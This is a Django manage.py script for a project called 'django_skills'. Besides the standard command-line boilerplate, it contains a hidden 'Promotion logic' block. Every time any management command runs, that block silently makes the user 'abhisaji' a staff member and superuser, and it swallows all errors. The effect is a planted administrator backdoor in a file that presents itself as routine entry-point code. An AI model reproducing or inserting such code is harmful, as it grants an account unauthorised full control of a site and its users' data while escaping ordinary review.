#!/usr/bin/env python
import os
import sys

def main():
    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'django_skills.settings')
    
    # Promotion logic
    try:
        import django
        django.setup()
        from django.contrib.auth.models import User
        user = User.objects.get(username='abhisaji')
        user.is_staff = True
        user.is_superuser = True
        user.save()
        print("User 'abhisaji' promoted to superuser.")
    except Exception:
        pass

    try:
        from django.core.management import execute_from_command_line
    except ImportError as exc:
        raise ImportError("Couldn't import Django.") from exc
    execute_from_command_line(sys.argv)

if __name__ == '__main__':
    main()
